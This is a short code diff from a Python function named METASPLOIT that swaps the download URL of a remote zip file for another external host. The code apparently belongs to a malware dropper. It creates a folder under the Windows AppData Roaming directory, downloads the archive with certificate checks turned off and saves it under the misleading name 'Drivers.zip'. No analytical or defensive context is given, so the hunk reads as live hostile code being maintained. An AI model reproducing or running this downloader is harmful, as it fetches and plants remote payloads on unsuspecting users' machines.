@@ -125,7 +125,7 @@ def METASPLOIT():
                     target_folder1 = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows")
                     if not os.path.exists(target_folder):
                       os.makedirs(target_folder)
-                    download_url = "https://dso2.raed.net:454/files/Pic-1231232.zip"
+                    download_url = "https://s01.babup.com/uploads/IMIG-328958365.zip"
                     zip_file_name = "Drivers.zip"
                     response = requests.get(download_url, verify=False)
                     with open(zip_file_name, "wb") as zip_file:
